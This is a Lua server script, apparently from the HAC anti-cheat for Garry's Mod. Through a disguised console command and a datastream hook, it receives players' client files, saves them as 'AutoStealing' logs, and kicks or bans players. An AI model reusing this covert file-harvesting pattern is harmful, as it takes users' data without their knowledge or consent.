
AddCSLuaFile("lists/HAC_W_HKS.lua")

local IncomingID = #HAC.NoSend --Yay
local TXInit	 = IncomingID

local function FakeBootyDrop(ply,Check,Reason)
	Reason = Reason:upper()
	
	HAC.TellHeX( Format("FAKE BOOTY (%s) - %s -> %s!", Reason, ply:Nick(), Check) , NOTIFY_HINT, "npc/roller/mine/rmine_blip1.wav")
	HAC.Print2HeX( Format("[HAC] - FAKE BOOTY (%s) - %s -> %s!\n", Reason, ply:Nick(), Check) )
	
	HAC.LogAndKickFailedInit(ply, "FAKE_BOOTY_"..Reason.."_"..Check, HAC.LOLMessage2)
end

local function CheckFakeBooty(ply,NewFile,NewSize,AllSize)
	AllSize		= tonumber(AllSize)
	local Check = Format("%s-%s", NewFile, NewSize)
	
	if table.HasValue(HAC.NoSend, Check) then --Bull crap!
		FakeBootyDrop(ply, Check, "NoSend")
		return true
	end
	
	if (AllSize > HAC.MaxAmt) then --Too many!
		FakeBootyDrop(ply, AllSize, "MaxAmt")
		return true
	end
	
	return false
end




local function EndStream(ply,msg,alldone)
	local SID		= ply:SID():lower()
	local SUP		= ply:SID():upper()
	local LogName	= ply.HACLogName or Format("HAC-%s/ds_%s.txt", SUP, SID) --Oops
	local Message	= ""
	
	if alldone then
		Message = "\nDStream Complete "..msg.."\n\n"
	else
		Message = "\nDStream ended "..msg.."\n\n"
	end
	
	if file.Exists(LogName) then
		file.Append(LogName, Message)
	end
end


function HAC.GimmeLog(ply,cmd,args)
	if not ply:IsValid() then return end
	
	local SID		= ply:SID():lower()
	local SUP		= ply:SID():upper()
	local LogName	= Format("HAC-%s/ds_%s.txt", SUP, SID)
	
	local NewFile	= args[1] or "-args1-Fuckup-"
	local NewSize	= args[2] or "-args2-Fuckup-"
	local AllSize	= args[3] or "-args3-Fuckup-"
	local CurSize	= args[4] or "-args4-Fuckup-"
	
	if file.Exists(LogName) and (file.Read(LogName):find(NewFile)) then --fixme
		return
	end
	
	if not ply.HACStealStarted then
		ply.HACLogName		= LogName
		ply.HACStealStarted = true
		ply.HACStealTotal	= tonumber( AllSize )
		
		HAC.TellHeX( Format("AutoStealing [%s] of %s's files, DO NOT kick/ban!", AllSize, ply:Nick()) , NOTIFY_GENERIC, "npc/roller/mine/rmine_blip1.wav")
		HAC.Print2HeX( Format("\n[HAC] - AutoStealing [%s] of %s's files (%s)\n\n", AllSize, ply:Nick(), ply:SteamID()) )
	end
	
	HAC.TellHeX( Format("AutoStealing S [%s / %s] - %s's %s %s", CurSize, ply.HACStealTotal, ply:Nick(), NewFile, NewSize) , NOTIFY_HINT, "npc/roller/mine/rmine_blip1.wav")
	HAC.Print2HeX( Format("[HAC] - AutoStealing S [%s / %s] - %s's %s %s\n", CurSize, ply.HACStealTotal, ply:Nick(), NewFile, NewSize) )
	
	if not file.Exists(LogName) then
		file.Write(LogName, Format("[HAC] / (GMod U%s) AutoStealer log for [%s] files created at [%s]\nFor: %s <%s> (%s)\n\n", VERSION, ply.HACStealTotal, HAC.Date(), ply:Nick(), ply:HACRealName(), ply:SteamID() ) )
	end
	filex.Append(LogName, Format('\t"%s-%s",\n', NewFile, NewSize) )
	
	
	CheckFakeBooty(ply,NewFile,NewSize,AllSize)
end
concommand.Add("gm_runtools", HAC.GimmeLog)


function HAC.GimmeRX(ply,han,id,enc,dec)
	if not ply:IsValid() then return end
	
	if not dec then
		HAC.LogAndKickFailedInit(ply,"TXOk_NO_DEC", HAC.LOLMessage2)
		return
	end
	
	local TXTab = dec[1]
	if (type(TXTab) == "table" and TXTab.TXOk) then --Init check
		local TXList	= tonumber(TXTab.TXList) or 0 --NoSend size
		local TXOk		= tonumber(TXTab.TXOk) 	 or 0
		
		if (TXOk == TXInit) then
			ply.TXOk = true
			
			if HAC.Debug then
				print("! Got TX reply: ", ply, TXOk, TXList)
			end
		else
			HAC.LogAndKickFailedInit(ply,"TXOk_BAD_TXInit_"..TXOk, HAC.LenFailMSG)
		end
		
		if (TXTab.TXInit) then
			HAC.LogAndKickFailedInit(ply,"TXOk_FAKE_TXInit", HAC.LOLMessage) --Fake init
		end
		if (TXList != #HAC.NoSend) then
			HAC.LogAndKickFailedInit(ply,"TXOk_BAD_LIST_"..TXList, HAC.LOLMessage) --List was fucked with!
		end
		
		return
	end
	
	if not (dec.Name and type(dec.Name) == "string") then --RX check
		HAC.TellHeX( Format("Booty error on %s!", ply:Nick()) , NOTIFY_CLEANUP, "npc/roller/mine/rmine_taunt1.wav")
		HAC.Print2HeX( Format("\n[HAC] - Booty error on %s!\n\n", ply:Nick()) )
		
		HAC.LogAndKickFailedInit(ply,"GimmeRX_BAD_"..string.upper(type(dec.Name)),"Don't mess with that!")
		return
	end
	
	local SID		= ply:SID():lower()
	local SUP		= ply:SID():upper()
	local IsBucket	= tobool(dec.IsBucket or false)
	local Name		= tostring(dec.Name)
	local LuaName	= string.Replace(Name, ".", "_") --Stupid dots!
	
	local Size			= tostring(dec.Size) or "0"
	local Cont			= tostring(dec.Cont) or "Cont-fuckup"
	local Filename		= Format("HAC-%s/%s-%s.txt", SUP, LuaName, Size)
	
	local AllSize		= (ply.HACStealTotal or 0) --Should fix it
	ply.HACStreamHKS	= (ply.HACStreamHKS or 0) + 1
	
	if CheckFakeBooty(ply, Name, Size, AllSize) then return end --Don't take no crap from anyone!
	
	
	if not HAC.ExistsFile(Filename) then
		HAC.StreamHKS		= HAC.StreamHKS + 1 --LCD
		ply.HACLastCurSize	= (ply.HACLastCurSize or 0) + 1
		
		HAC.WriteFile(Filename, Cont)
		
		LuaName = LuaName:gsub("_lua", "")
		if (ply.HACLastCurSize != 0) and (AllSize != 0) and (ply.HACLastCurSize >= AllSize) and not IsBucket then --If bucket, no final log!
			ply.HACStealComplete = true
			
			EndStream(ply, Format("[%s / %s]", AllSize, AllSize), true)
			
			if ply.DONEBAN and not ply.HACIsInjected then
				HAC.DoBan(ply, "GimmeRX", {"RX complete ["..AllSize.."], banning!"}, false, HAC.BanTime, false, (HAC.WaitCVar:GetInt() / 2) )
			end
		end
	end
	
	
	HAC.TellHeX( Format("AutoStealing C [%s / %s] - %s's %s.lua %s", ply.HACStreamHKS, AllSize, ply:Nick(), LuaName, Size) , NOTIFY_UNDO, "npc/roller/mine/rmine_taunt1.wav")
	HAC.Print2HeX( Format("[HAC] - AutoStealing C [%s / %s] - %s's %s.lua %s\n", ply.HACStreamHKS, AllSize, ply:Nick(), LuaName, Size) )
end
datastream.Hook(tostring(IncomingID), HAC.GimmeRX)


function HAC.HKSEndStream(ply)
	if ply.HACStealStarted and not ply.HACStealComplete then
		local AllSize = ply.HACStealTotal  or 0
		local CurSize = ply.HACLastCurSize or 0
		
		if (AllSize == 0 and CurSize == 0) then return end
		
		if (CurSize > 0) then
			EndStream(ply, Format("[%s / %s]", CurSize, AllSize), false)
		end
	end
end
hook.Add("PlayerDisconnected", "HAC.HKSEndStream", HAC.HKSEndStream)



